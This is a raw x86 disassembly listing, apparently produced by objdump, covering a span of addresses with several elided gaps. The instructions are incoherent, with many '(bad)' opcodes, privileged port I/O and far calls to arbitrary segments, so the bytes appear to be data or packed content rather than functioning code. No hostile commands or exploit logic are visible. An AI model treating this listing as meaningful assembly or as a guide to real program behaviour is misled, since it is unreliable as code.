  42de06:	cmp    eax,0x6d3bd081
  42de0b:	loope  0x42de50
  42de0d:	sbb    ecx,esp
  42de0f:	aad    0x54
  42de11:	jl     0x42de3c
  42de13:	pop    bx
  42de15:	mov    ebx,0x14379502
  42de1a:	in     al,dx
  42de1b:	mov    esp,0x891c7424
  42de20:	sbb    esp,edx
  42de22:	xchg   DWORD PTR [ebp+eiz*2-0x46],esp
  42de26:	js     0x42ddf0
  42de28:	pop    es
  42de29:	out    dx,al
  42de2a:	cmp    esp,DWORD PTR [edi+0x59]
  42de2d:	mov    ecx,0x990fd5b3
  42de32:	stos   DWORD PTR es:[edi],eax
  42de33:	fadd   DWORD PTR [esi-0x4a]
  42de36:	fwait
  42de37:	sbb    BYTE PTR [ebx+ebp*2+0x52c5a119],0x1a
  42de3f:	mov    BYTE PTR ds:0x40,al
	...
  42deb1:	add    BYTE PTR [eax],al
  42deb3:	add    BYTE PTR [ebx+0x3d],dh
  42deb6:	fadd   st,st(1)
  42deb8:	fsubrp st(5),st
  42deba:	jnp    0x42de7b
  42debc:	push   ds
  42debd:	xor    edi,DWORD PTR [esi-0x46632f4]
  42dec3:	mov    dh,0x1e
  42dec5:	out    0x1,al
  42dec7:	add    dh,dh
  42dec9:	add    BYTE PTR [eax],al
  42decb:	add    cl,dl
  42decd:	clc    
  42dece:	scas   eax,DWORD PTR es:[edi]
  42decf:	outs   dx,BYTE PTR ds:[esi]
  42ded0:	lock rcl BYTE PTR [ecx+0x48],0xcb
  42ded5:	popf   
  42ded6:	dec    edi
  42ded7:	enter  0x3042,0x54
  42dedb:	test   BYTE PTR [edi],ch
  42dedd:	fdivr  st(2),st
  42dedf:	inc    ebp
  42dee0:	jp     0x42dee2
  42dee2:	aas    
  42dee3:	std    
  42dee4:	ret    
  42dee5:	rcr    BYTE PTR [edi+esi*1+0xb],0xf2
  42deea:	mov    bh,0xe0
  42deec:	mov    al,BYTE PTR [edi]
  42deee:	dec    edx
  42deef:	pop    ss
  42def0:	test   eax,0xbea8159c
  42def5:	push   edi
  42def6:	test   eax,0x319e566
  42defb:	fwait
  42defc:	inc    ecx
  42defd:	lahf   
  42defe:	dec    ebp
  42deff:	pop    ecx
  42df00:	jns    0x42dea9
  42df02:	icebp  
  42df03:	pop    ecx
  42df04:	out    0xd0,al
  42df06:	add    eax,0x8a43f194
  42df0b:	aaa    
  42df0c:	stos   BYTE PTR es:[edi],al
  42df0d:	(bad)  
  42df0e:	mov    cl,0x5e
  42df10:	out    0x7,al
  42df12:	or     al,0xcb
  42df14:	in     al,0x2b
  42df16:	sub    DWORD PTR [esi],esp
  42df18:	jge    0x42df8e
  42df1a:	fcom   QWORD PTR [edi]
  42df1c:	sub    dl,0x53
  42df1f:	adc    ebp,DWORD PTR [edi]
  42df21:	sub    bh,BYTE PTR [edi-0x2a]
  42df24:	(bad)  
  42df25:	mov    ch,0x10
  42df27:	fsub   st(0),st
  42df29:	add    bl,BYTE PTR [edx]
  42df2b:	rcl    DWORD PTR [edx],cl
  42df2d:	sbb    ch,ah
  42df2f:	mov    esp,0xbaa81faa
  42df34:	lds    eax,FWORD PTR [ecx+0xe637038]
  42df3a:	inc    ebx
  42df3b:	nop
  42df3c:	das    
  42df3d:	or     eax,0xa877cb4b
  42df42:	aad    0xa
  42df44:	mov    esi,0xc02fd5e0
  42df49:	push   edi
  42df4a:	inc    edx
  42df4b:	jne    0x42dedb
  42df4d:	xor    DWORD PTR [edx+0x231fe04d],ebx
  42df53:	and    DWORD PTR [edi-0x1f28e37f],ebp
  42df59:	rol    BYTE PTR [edx+ecx*4-0x6a0b777c],0x23
  42df61:	int3   
  42df62:	(bad)  
  42df63:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  42df65:	shl    DWORD PTR [edi+ebp*8],0xb2
  42df69:	xchg   esi,eax
  42df6a:	xlat   BYTE PTR ds:[ebx]
  42df6b:	pushf  
  42df6c:	repz gs or eax,0xfd391f4b
  42df73:	sbb    edx,DWORD PTR [ebx+0x1b3fe2ce]
  42df79:	sbb    al,0x98
  42df7b:	cdq    
  42df7c:	jmp    0x8e80a1d2
  42df81:	fist   WORD PTR gs:[ebx]
  42df84:	arpl   WORD PTR [eax-0x14],cx
  42df87:	push   esi
  42df88:	push   edx
  42df89:	mov    bh,0xf8
  42df8b:	dec    ecx
  42df8c:	adc    edi,DWORD PTR [ebp-0x217e745b]
  42df92:	pop    ebx
  42df93:	jns    0x42dfd4
  42df95:	fs cld 
  42df97:	mov    edx,0xb601b11f
  42df9c:	sbb    dh,al
  42df9e:	aad    0xa5
  42dfa0:	jns    0x42dfc5
  42dfa2:	sbb    ecx,DWORD PTR [ebx-0x4a]
  42dfa5:	lods   eax,DWORD PTR ds:[esi]
  42dfa6:	sbb    al,0x40
  42dfa8:	pop    es
  42dfa9:	scas   eax,DWORD PTR es:[edi]
  42dfaa:	sar    BYTE PTR [esi-0x8dc332f],cl
  42dfb0:	test   DWORD PTR [edx],edi
  42dfb2:	mov    es,eax
  42dfb4:	jo     0x42e015
  42dfb6:	adc    ebp,edx
  42dfb8:	push   ecx
  42dfb9:	cld    
  42dfba:	pop    esp
  42dfbb:	out    dx,eax
  42dfbc:	addr16 pop esi
  42dfbe:	cmp    DWORD PTR [edx+0x81dc],esp
	...
  42e034:	push   eax
  42e035:	cmp    al,dh
  42e037:	sub    al,0xee
  42e039:	cld    
  42e03a:	cli    
  42e03b:	jle    0x42e08c
  42e03d:	add    BYTE PTR [ebx+0x38375de2],0x63
  42e044:	adc    al,0xe7
  42e046:	add    DWORD PTR [eax],eax
  42e048:	test   BYTE PTR [eax],0x0
  42e04b:	add    BYTE PTR ds:0x551c554c,cl
  42e051:	aad    0x32
  42e053:	dec    edi
  42e054:	imul   ebx,DWORD PTR [esi],0x6b2ed9ec
  42e05a:	add    ecx,DWORD PTR [esi]
  42e05c:	test   al,0xaf
  42e05e:	inc    ecx
  42e05f:	pop    ebx
  42e060:	mov    ah,0x16
  42e062:	or     cl,BYTE PTR [edi+0x30c745c8]
  42e068:	repz pop eax
  42e06a:	mov    esi,0x332132fe
  42e06f:	test   eax,0xe1cfa06
  42e074:	cmp    al,0x7c
  42e076:	mov    bl,0x7c
  42e078:	add    ebp,DWORD PTR [ebp+0x64]
  42e07b:	add    cl,BYTE PTR [eax-0x55]
  42e07e:	(bad)
  42e081:	mov    ecx,0xc6e5a48e
  42e086:	lods   al,BYTE PTR ds:[esi]
  42e087:	lods   al,BYTE PTR ds:[esi]
  42e088:	cmp    eax,0xb2892d47
  42e08d:	rcr    DWORD PTR [eax+0x79bf18c6],cl
  42e093:	xchg   BYTE PTR [esi+0x38],bh
  42e096:	out    dx,al
  42e097:	aas    
  42e098:	mov    eax,0xf04fae7f
  42e09d:	aas    
  42e09e:	mov    edi,0xb6294f48
  42e0a3:	ret    
  42e0a4:	iret   
  42e0a5:	bound  eax,QWORD PTR [ecx]
  42e0a7:	mov    edx,0xb3753f41
  42e0ac:	dec    esp
  42e0ad:	xchg   esi,eax
  42e0ae:	repz iret 
  42e0b0:	dec    eax
  42e0b1:	xor    eax,0x5d26441
  42e0b6:	mul    DWORD PTR [edi-0x69]
  42e0b9:	fwait
  42e0ba:	or     bl,BYTE PTR [ebx-0x75]
  42e0bd:	xchg   ecx,eax
  42e0be:	lds    eax,FWORD PTR [esi+0x7e]
  42e0c1:	dec    eax
  42e0c2:	cmc    
  42e0c3:	in     al,0xd
  42e0c5:	jo     0x42e13d
  42e0c7:	call   0xae66:0x67835756
  42e0ce:	sti    
  42e0cf:	dec    edi
  42e0d0:	or     ecx,esi
  42e0d2:	sub    eax,0x2b4c1449
  42e0d7:	mov    edi,0x72c146bc
  42e0dc:	xchg   esp,eax
  42e0dd:	pushf  
  42e0de:	inc    ebx
  42e0df:	and    dh,BYTE PTR [edi+0x3c]
  42e0e2:	call   0xb880:0x1fbb9f98
  42e0e9:	ds dec esi
  42e0eb:	(bad)  
  42e0ec:	xor    ebx,DWORD PTR [ebx+0x1e]
  42e0ef:	mov    ecx,0x20b99f2d
  42e0f4:	and    DWORD PTR [ebp+edx*8+0x60],edx
  42e0f8:	inc    edx
  42e0f9:	cdq    
  42e0fa:	push   cs
  42e0fb:	mov    al,0xed
  42e0fd:	ds aam 0x80
  42e100:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e101:	std    
  42e102:	into   
  42e103:	data16 (bad) 
  42e105:	data16 adc bl,BYTE PTR [ebx-0x6b187684]
  42e10c:	ins    DWORD PTR es:[edi],dx
  42e10d:	and    BYTE PTR [edx+0x3f],0xa3
  42e111:	and    ebx,ecx
  42e113:	mov    ecx,0x4c6f9a0c
  42e118:	cdq    
  42e119:	and    eax,0x8bb6c866
  42e11e:	and    BYTE PTR [eax+ebp*2-0x2b],al
  42e122:	sbb    esp,DWORD PTR [ebx-0x2a]
  42e125:	jecxz  0x42e0f2
  42e127:	pop    edx
  42e128:	test   eax,0xee82748c
  42e12d:	adc    edi,DWORD PTR [esi+0x70]
  42e130:	or     ebx,DWORD PTR [bp+si-0x707d]
  42e135:	mov    bl,0x44
  42e137:	(bad)  
  42e138:	movups xmm0,XMMWORD PTR [edi+0x7f]
  42e13c:	adc    edx,DWORD PTR ds:0x4a3fc03e
	...
  42e1b2:	add    BYTE PTR [eax],al
  42e1b4:	lea    ecx,[eax]
  42e1b6:	pop    ebp
  42e1b7:	jbe    0x42e196
  42e1b9:	ja     0x42e16a
  42e1bb:	sti    
  42e1bc:	dec    esi
  42e1bd:	push   edx
  42e1be:	sbb    eax,0x5ef1bf71
  42e1c3:	loopne 0x42e1cf
  42e1c5:	call   0x138e1cb
  42e1ca:	add    BYTE PTR [eax],al
  42e1cc:	jl     0x42e1cf
  42e1ce:	in     eax,dx
  42e1cf:	addr16 jns 0x42e176
  42e1d2:	neg    BYTE PTR [edx+ecx*2]
  42e1d5:	pop    esp
  42e1d6:	xchg   ebx,eax
  42e1d7:	std    
  42e1d8:	pop    ds
  42e1d9:	jo     0x42e1ff
  42e1db:	xchg   edx,eax
  42e1dc:	push   eax
  42e1dd:	adc    al,0x14
  42e1df:	adc    al,BYTE PTR [ebx+0x73]
  42e1e2:	mov    esi,0xbadde2b2
  42e1e7:	mov    ch,BYTE PTR [ebx+0x76]
  42e1ea:	lds    ebx,FWORD PTR [ecx+edi*4-0x6e]
  42e1ee:	push   ss
  42e1ef:	push   edi
  42e1f0:	cmp    eax,0x1959dc62
  42e1f5:	xchg   ah,ah
  42e1f7:	mov    ds:0xd5d6bcf7,al
  42e1fc:	ror    BYTE PTR [edx-0x58c8027c],1
  42e202:	fst    DWORD PTR [esi+0x3e]
  42e205:	out    dx,eax
  42e206:	aad    0x17
  42e208:	call   0x6431:0xe945a92c
  42e20f:	loopne 0x42e1fc
  42e211:	or     al,0xd5
  42e213:	or     DWORD PTR [esi+edx*4-0x2],ebx
  42e217:	popa   
  42e218:	js     0x42e23b
  42e21a:	add    ch,BYTE PTR [ebp-0x41]
  42e21d:	test   BYTE PTR [ecx-0x12],0xd7
  42e221:	add    al,0x2e
  42e223:	sbb    eax,0xece12f73
  42e228:	call   0xa5456086
  42e22d:	jns    0x42e1b4
  42e22f:	sub    esi,DWORD PTR [eax]
  42e231:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e232:	aam    0x45
  42e234:	rcl    DWORD PTR [ebx+0x33],1
  42e237:	jnp    0x42e258
  42e239:	xchg   esi,eax
  42e23a:	jne    0x42e20a
  42e23c:	mov    ch,ch
  42e23e:	ficom  DWORD PTR [ebx+edi*4+0x37]
  42e242:	or     al,0x27
  42e244:	cld    
  42e245:	xor    eax,0x4c2d66a9
  42e24a:	or     dh,BYTE PTR [ecx-0x30be9f98]
  42e250:	dec    esp
  42e251:	cmp    eax,0xc7e52c3f
  42e256:	or     al,BYTE PTR [edx-0x6e]
  42e259:	dec    ecx
  42e25a:	mov    ebp,0xdb7de2ea
  42e25f:	add    al,0xe8
  42e261:	jp     0x42e234
  42e263:	outs   dx,BYTE PTR ds:[esi]
  42e264:	sar    DWORD PTR [ebx+eax*1+0x55],cl
  42e268:	mov    ebp,0x334f0fd2
  42e26d:	mov    edi,DWORD PTR [ebp-0x5a]
  42e270:	push   0xffffffd8
  42e272:	lods   al,BYTE PTR ds:[esi]
  42e273:	or     eax,0x305dcdb8
  42e278:	push   0x79
  42e27a:	out    0x62,al
  42e27c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e27d:	add    ebx,DWORD PTR [edi]
  42e27f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e280:	scas   al,BYTE PTR es:[edi]
  42e281:	loope  0x42e221
  42e283:	int    0x67
  42e285:	push   0x5da91d1c
  42e28a:	xchg   esp,eax
  42e28b:	call   0x2ce6dfea
  42e290:	lds    esp,FWORD PTR [eax+0x473ec005]
  42e296:	pop    es
  42e297:	cdq    
  42e298:	mov    fs,WORD PTR [ecx-0x3b]
  42e29b:	pop    edx
  42e29c:	icebp  
  42e29d:	push   edx
  42e29e:	xor    bl,bh
  42e2a0:	call   0x41e:0x9f024452
  42e2a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e2a8:	test   al,0x67
  42e2aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e2ab:	fs fdivrp st(4),st
  42e2ae:	adc    al,0x90
  42e2b0:	out    dx,eax
  42e2b1:	aam    0x64
  42e2b3:	inc    edx
  42e2b4:	push   eax
  42e2b5:	test   dl,0xdf
  42e2b8:	ss pop ebp
  42e2ba:	cli    
  42e2bb:	addr16 stc 
  42e2bd:	mov    ds:0xe8c9139f,eax
	...
  42e332:	add    BYTE PTR [eax],al
  42e334:	ror    esi,0x63
  42e337:	cdq    
  42e338:	outs   dx,DWORD PTR ds:[esi]
  42e339:	mov    ebp,0x5146defb
  42e33e:	cmc    
  42e33f:	or     DWORD PTR ds:0x1c5e2,ebp
  42e345:	jmp    0x138e34b
  42e34a:	add    BYTE PTR [eax],al
  42e34c:	es pop edx
  42e34e:	int3   
  42e34f:	mov    ds:0x6ad68fe3,eax
  42e354:	push   ss
  42e355:	sub    eax,0xae844e24
  42e35a:	js     0x42e35f
  42e35c:	and    BYTE PTR [ebp+0x118fe3e5],cl
  42e362:	mov    esi,0x9f8d2c31
  42e367:	pop    ss
  42e368:	mov    esi,0x12f73fff
  42e36d:	leave  
  42e36e:	shl    DWORD PTR [edi-0x469a986f],cl
  42e374:	xchg   edx,eax
  42e375:	mov    edx,0x144ec30a
  42e37a:	xchg   esp,eax
  42e37b:	add    BYTE PTR [ebp-0x61],0x4e
  42e37f:	pop    edx
  42e380:	or     eax,0x856d15bf
  42e385:	fnstsw WORD PTR [ebx+edx*4+0x7a]
  42e389:	push   ecx
  42e38a:	cmp    al,0x23
  42e38c:	(bad)  
  42e38d:	cmp    bl,BYTE PTR [edi+edx*4-0x5578e404]
  42e394:	call   0x7eb0:0x25d5f487
  42e39b:	push   ebp
  42e39c:	inc    ecx
  42e39d:	pop    esp
  42e39e:	imul   ebx,DWORD PTR [ebp-0x2c],0xffffffa4
  42e3a2:	lock or DWORD PTR [eax+edx*1-0x510a235b],edx
  42e3aa:	inc    esi
  42e3ab:	cmp    al,BYTE PTR ds:0xa6485d6a
  42e3b1:	stos   BYTE PTR es:[edi],al
  42e3b2:	iret   
  42e3b3:	pop    esi
  42e3b4:	xor    bh,ch
  42e3b6:	cdq    
  42e3b7:	and    eax,0xea083f35
  42e3bc:	addr16 enter 0x14d8,0xc6
  42e3c1:	sbb    DWORD PTR [ebx+0x4a],ebx
  42e3c4:	lds    edi,FWORD PTR [eax]
  42e3c6:	jmp    0xc6a2395
  42e3cb:	cld    
  42e3cc:	dec    ebp
  42e3cd:	(bad)  
  42e3ce:	jp     0x42e418
  42e3d0:	add    al,0xf9
  42e3d2:	nop
  42e3d3:	xchg   edi,eax
  42e3d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e3d5:	sub    bl,BYTE PTR [ebx+0x42]
  42e3d8:	aad    0xdf
  42e3da:	sar    DWORD PTR [eax-0x17502fd6],cl
  42e3e0:	lahf   
  42e3e1:	dec    esi
  42e3e2:	loop   0x42e3bd
  42e3e4:	add    eax,DWORD PTR [eax]
  42e3e6:	jns    0x42e443
  42e3e8:	mov    eax,ds:0xae9916d1
  42e3ed:	aad    0xa7
  42e3ef:	or     DWORD PTR [ebx],edx
  42e3f1:	or     ebp,0x51e117ee
  42e3f7:	mul    BYTE PTR [ebx-0x1]
  42e3fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e3fb:	mov    ecx,0x6466735c
  42e400:	sar    DWORD PTR ds:0xc555d6c4,0x82
  42e407:	aad    0x19
  42e409:	loope  0x42e416
  42e40b:	ret    0x945f
  42e40e:	arpl   WORD PTR [ebx-0x5c],cx
  42e411:	ins    BYTE PTR es:[edi],dx
  42e412:	int3   
  42e413:	inc    ecx
  42e414:	mov    dh,0x40
  42e416:	xor    eax,0x7b1b8c3c
  42e41b:	add    eax,0xa7007fd
  42e420:	loopne 0x42e438
  42e422:	pop    ecx
  42e423:	orps   xmm4,XMMWORD PTR [ebx]
  42e426:	cmp    ecx,DWORD PTR [esi-0x1b]
  42e429:	jo     0x42e445
  42e42b:	dec    edx
  42e42c:	sti    
  42e42d:	dec    esi
  42e42e:	std    
  42e42f:	enter  0x9f68,0x5b
  42e433:	fld    TBYTE PTR [edx+0x2979fab2]
  42e439:	mov    dl,0x79
  42e43b:	adc    BYTE PTR [ebx+0x503a60c8],dl
  42e441:	test   BYTE PTR [eax],al
	...
  42e4b3:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42e4b9:	ja     0x42e494
  42e4bb:	dec    DWORD PTR [edi]
  42e4bd:	jecxz  0x42e4a2
  42e4bf:	mov    esp,0x780b0e3d
  42e4c4:	imul   cl
  42e4c6:	add    DWORD PTR [eax],eax
  42e4c8:	test   BYTE PTR [eax],0x0
  42e4cb:	add    BYTE PTR [eax],dh
  42e4cd:	xchg   ecx,eax
  42e4ce:	push   ds
  42e4cf:	push   ss
  42e4d0:	pushf  
  42e4d1:	inc    eax
  42e4d2:	into   
  42e4d3:	mov    eax,ds:0x389fb2b4
  42e4d8:	stos   DWORD PTR es:[edi],eax
  42e4d9:	dec    ebx
  42e4da:	dec    BYTE PTR [esi-0x48765f16]
  42e4e0:	popf   
  42e4e1:	ja     0x42e53b
  42e4e3:	imul   ecx,DWORD PTR [ebx-0x68196992],0x3f
  42e4ea:	adc    al,0xa4
  42e4ec:	xor    al,0x1c
  42e4ee:	mov    esi,0x9574c4dc
  42e4f3:	pop    eax
  42e4f4:	js     0x42e4f0
  42e4f6:	pop    ss
  42e4f7:	xchg   ecx,eax
  42e4f8:	sub    cl,BYTE PTR [esi]
  42e4fa:	ret    
  42e4fb:	and    BYTE PTR [edx],bh
  42e4fd:	ds imul esi,edx,0x270455bc
  42e504:	dec    esp
  42e505:	push   ds
  42e506:	push   cs
  42e507:	sahf   
  42e508:	dec    edi
  42e509:	dec    esi
  42e50a:	scas   eax,DWORD PTR es:[edi]
  42e50b:	jb     0x42e4d5
  42e50d:	iret   
  42e50e:	ret    0xa0de
  42e511:	call   0xa642cdbb
  42e516:	dec    ebx
  42e517:	(bad)  
  42e519:	jg     0x42e590
  42e51b:	int3   
  42e51c:	jl     0x42e4cc
  42e51e:	mov    esi,0xd8d64224
  42e523:	cmc    
  42e524:	xor    DWORD PTR ds:0x8ca55009,esp
  42e52a:	aaa    
  42e52b:	test   eax,0xb79d09ee
  42e530:	mov    ch,dh
  42e532:	jl     0x42e589
  42e534:	enter  0xf6ac,0x59
  42e538:	adc    bl,cl
  42e53a:	es sti 
  42e53c:	sub    al,0x54
  42e53e:	and    esp,esp
  42e540:	(bad)  
  42e541:	xor    DWORD PTR [ebx],esp
  42e543:	shr    DWORD PTR [ecx-0x275ffd9a],1
  42e549:	pop    ss
  42e54a:	and    bh,BYTE PTR [ebx-0x7fa861d2]
  42e550:	xchg   ebx,eax
  42e551:	pop    esi
  42e552:	mov    bh,0xb9
  42e554:	xchg   edi,eax
  42e555:	clc    
  42e556:	leave  
  42e557:	and    al,0x1e
  42e559:	xor    eax,ebx
  42e55b:	into   
  42e55c:	repnz lock inc eax
  42e55f:	or     eax,0x43cf44ba
  42e564:	dec    edi
  42e565:	das    
  42e566:	jae    0x42e557
  42e568:	mov    ebx,0x60adf33e
  42e56d:	jo     0x42e556
  42e56f:	adc    DWORD PTR [esi+ebp*2],edx
  42e572:	xchg   edi,eax
  42e573:	sbb    al,0x2b
  42e575:	mov    BYTE PTR ds:0xbd8c8c64,cl
  42e57b:	in     eax,dx
  42e57c:	adc    esi,DWORD PTR [eax+ecx*1-0x1a]
  42e580:	push   0x1d
  42e582:	ret    0xa854
  42e585:	sub    eax,0x7a5aada7
  42e58a:	add    BYTE PTR [ebp-0x1c7e9591],ah
  42e590:	push   es
  42e591:	(bad)  [esp+ebx*1-0x76]
  42e595:	add    DWORD PTR [eax],esp
  42e597:	cmp    BYTE PTR fs:[ecx+0x66163fb2],0xc7
  42e59f:	popa   
  42e5a0:	jp     0x42e577
  42e5a2:	dec    ebx
  42e5a3:	stc    
  42e5a4:	out    dx,eax
  42e5a5:	fmulp  st(4),st
  42e5a7:	fiadd  DWORD PTR [edi-0x3e]
  42e5aa:	ficom  DWORD PTR [esi+0x24]
  42e5ad:	lahf   
  42e5ae:	add    eax,DWORD PTR [edx-0x51ffa0d5]
  42e5b4:	cmp    BYTE PTR [edx-0x2cf8acbc],ah
  42e5ba:	dec    edi
  42e5bb:	aaa    
  42e5bc:	lods   eax,DWORD PTR ds:[esi]
  42e5bd:	stc    
  42e5be:	aam    0x2e
  42e5c0:	cli    
  42e5c1:	xchg   ebx,eax
	...
  42e632:	add    BYTE PTR [eax],al
  42e634:	repz add esp,DWORD PTR [eax]
  42e637:	(bad)  
  42e638:	lock scas eax,DWORD PTR es:[edi]
  42e63a:	(bad)  
  42e63b:	jg     0x42e5e4
  42e63d:	mov    WORD PTR [esi+0x5f],es
  42e640:	nop
  42e641:	in     eax,dx
  42e642:	push   cs
  42e643:	ins    DWORD PTR es:[edi],dx
  42e644:	in     al,dx
  42e645:	jmp    0x0:0xf60001
  42e64c:	ret    
  42e64d:	fs enter 0xf9ac,0xd7
  42e652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e653:	inc    esi
  42e654:	push   eax
  42e655:	mov    ebp,0xc80c0ab3
  42e65a:	inc    edx
  42e65b:	xchg   ebx,eax
  42e65c:	mov    esi,DWORD PTR [ebx-0x4fe49cf2]
  42e662:	mov    WORD PTR [edx+eiz*1-0x58],?
  42e666:	cmp    al,0x2e
  42e668:	mov    eax,ds:0xf2d9efef
  42e66d:	es jb  0x42e6de
  42e670:	pop    esp
  42e671:	hlt    
  42e672:	adc    BYTE PTR [eax+0x3b],ah
  42e675:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e676:	(bad)  
  42e677:	(bad)  
  42e678:	pop    eax
  42e679:	mov    esp,DWORD PTR [ebx-0x66]
  42e67c:	jmp    0x7b183d2d
  42e681:	pop    ecx
  42e682:	shl    BYTE PTR [edx+0x76b7b800],cl
  42e688:	add    DWORD PTR [ecx+0x5c],ebp
  42e68b:	retf   0xc7a4
  42e68e:	jmp    0x42e68c
  42e690:	and    edi,edi
  42e692:	and    al,0x54
  42e694:	mov    esp,0xb2ea53f7
  42e699:	rcl    dl,cl
  42e69b:	sbb    al,0xd
  42e69d:	out    0x4b,eax
  42e69f:	fs cmp al,0x7e
  42e6a2:	sbb    eax,0x50fd77c9
  42e6a7:	call   0xc2008890
  42e6ac:	push   ecx
  42e6ad:	pusha  
  42e6ae:	cmp    eax,0xe55692ef
  42e6b3:	push   0x18
  42e6b5:	mov    DWORD PTR [edx-0x19a3b80e],edx
  42e6bb:	xor    al,BYTE PTR [ecx-0x2323bb80]
  42e6c1:	inc    esi
  42e6c2:	mov    ecx,0x188cafa0
  42e6c7:	fnstenv [esi]
  42e6c9:	imul   ebp,DWORD PTR [eax+ebp*1-0x30],0x28
  42e6ce:	test   BYTE PTR [edi-0x2a],cl
  42e6d1:	jno    0x42e6b3
  42e6d3:	inc    esi
  42e6d4:	dec    esp
  42e6d5:	and    edx,DWORD PTR [edx+ebp*2]
  42e6d8:	jge    0x42e6fe
  42e6da:	lock jno 0x42e6c3
  42e6dd:	test   BYTE PTR ds:0x1cfca1cf,0x5a
  42e6e4:	stos   BYTE PTR es:[edi],al
  42e6e5:	jbe    0x42e6b9
  42e6e7:	inc    eax
  42e6e8:	jbe    0x42e6ed
  42e6ea:	adc    BYTE PTR [edx],ch
  42e6ec:	mov    ah,0x5e
  42e6ee:	popf   
  42e6ef:	and    al,0x6b
  42e6f1:	je     0x42e724
  42e6f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e6f4:	xchg   ecx,eax
  42e6f5:	fldenv [ecx+0x644d9d9b]
  42e6fb:	inc    edi
  42e6fc:	push   ss
  42e6fd:	jecxz  0x42e6e7
  42e6ff:	jg     0x42e6ca
  42e701:	cld    
  42e702:	jecxz  0x42e726
  42e704:	xor    edx,DWORD PTR [esi]
  42e706:	and    dh,bl
  42e708:	sar    ecx,cl
  42e70a:	test   al,0x2f
  42e70c:	neg    BYTE PTR [ebx+0xf92c5e3]
  42e712:	push   ebp
  42e713:	repz push es
  42e715:	push   esi
  42e716:	cmp    al,0xc4
  42e718:	mov    edi,0x4ee03fc0
  42e71d:	adc    esi,DWORD PTR es:[esi-0x4c6c0dd5]
  42e724:	ror    BYTE PTR [ebx-0x2],1
  42e727:	js     0x42e759
  42e729:	mov    al,0x22
  42e72b:	cwde   
  42e72c:	cld    
  42e72d:	mov    cl,0xf1
  42e72f:	push   ds
  42e730:	cmp    esi,edx
  42e732:	jno    0x42e76e
  42e734:	dec    ecx
  42e735:	test   al,0x1d
  42e737:	stc    
  42e738:	dec    edi
  42e739:	push   edx
  42e73a:	test   BYTE PTR [edi+0x24d2928a],0x1d
  42e741:	dec    esp
	...
  42e7b2:	add    BYTE PTR [eax],al
  42e7b4:	xchg   esi,eax
  42e7b5:	fwait
  42e7b6:	cwde   
  42e7b7:	pop    edi
  42e7b8:	popf   
  42e7b9:	pop    edi
  42e7ba:	xlat   BYTE PTR ds:[ebx]
  42e7bb:	fisttp DWORD PTR [esi-0x5df2aa8a]
  42e7c1:	inc    edi
  42e7c2:	pop    ebx
  42e7c3:	icebp  
  42e7c4:	loop   0x42e7b1
  42e7c6:	add    DWORD PTR [eax],eax
  42e7c8:	test   BYTE PTR [eax],0x0
  42e7cb:	add    bl,dh
  42e7cd:	cdq    
  42e7ce:	pop    ebx
  42e7cf:	dec    cx
  42e7d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e7d2:	ins    DWORD PTR es:[edi],dx
  42e7d3:	push   ebp
  42e7d4:	push   ebp
  42e7d5:	ret    0xce13
  42e7d8:	jbe    0x42e777
  42e7da:	and    eax,0x26a710c0
  42e7df:	aaa    
  42e7e0:	das    
  42e7e1:	ins    DWORD PTR es:[edi],dx
  42e7e2:	das    
  42e7e3:	arpl   WORD PTR [edi+0x35],sp
  42e7e6:	ret    0xc3ba
  42e7e9:	mov    ch,0xc7
  42e7eb:	shl    BYTE PTR ds:0x9499d52a,0x42
  42e7f2:	cmp    DWORD PTR [ebp+0x51579ef1],eax
  42e7f8:	push   esi
  42e7f9:	push   0x638d4339
  42e7fe:	test   eax,0x9e86896d
  42e803:	dec    edx
  42e804:	adc    dl,ch
  42e806:	sbb    ah,cl
  42e808:	in     eax,dx
  42e809:	test   al,0x9c
  42e80b:	cmp    al,0xce
  42e80d:	sub    al,BYTE PTR [esi-0x22]
  42e810:	xchg   ebx,eax
  42e811:	mov    eax,0xc6addc06
  42e816:	or     ecx,DWORD PTR [edx]
  42e818:	mov    esp,0x844afe19
  42e81d:	pop    es
  42e81e:	aas    
  42e81f:	les    ebp,FWORD PTR [edx-0x24]
  42e822:	sbb    BYTE PTR [ecx],0x89
  42e825:	jb     0x42e860
  42e827:	sbb    DWORD PTR [esi+0x3e],ebp
  42e82a:	bound  esp,QWORD PTR [edx*2+0x120aef2f]
  42e831:	mov    cl,BYTE PTR [ebp+0x7d5feb7a]
  42e837:	stos   DWORD PTR es:[edi],eax
  42e838:	imul   esp,DWORD PTR [esi-0x777687f5],0xbbd4f61b
  42e842:	and    edx,DWORD PTR [edi]
  42e844:	(bad)  [eax]
  42e846:	loopne 0x42e843
  42e848:	loop   0x42e814
  42e84a:	aaa    
  42e84b:	add    eax,0x5021633d
  42e850:	dec    ebx
  42e851:	mov    esi,0x58c19cf2
  42e856:	mov    esp,0x373a0679
  42e85b:	test   al,0xca
  42e85d:	sub    al,0xa1
  42e85f:	cmp    ecx,DWORD PTR [esi+0x174bb905]
  42e865:	rcr    dl,1
  42e867:	cli    
  42e868:	das    
  42e869:	icebp  
  42e86a:	mov    bl,0xc
  42e86c:	dec    edi
  42e86d:	outs   dx,DWORD PTR ds:[esi]
  42e86e:	xchg   ecx,eax
  42e86f:	mov    ds:0x1dfe1ffe,eax
  42e874:	pop    eax
  42e875:	out    dx,al
  42e876:	mov    di,0x302e
  42e87a:	add    eax,esp
  42e87c:	or     dl,0xb0
  42e87f:	pop    ss
  42e880:	sub    BYTE PTR [ebp-0x1d],bh
  42e883:	imul   ebx
  42e885:	sub    DWORD PTR [edi-0x68],0x59f0ed33
  42e88c:	popa   
  42e88d:	xchg   ecx,eax
  42e88e:	sub    ecx,0xeb15b391
  42e894:	xchg   ebp,eax
  42e895:	mov    dl,0xa1
  42e897:	inc    ebp
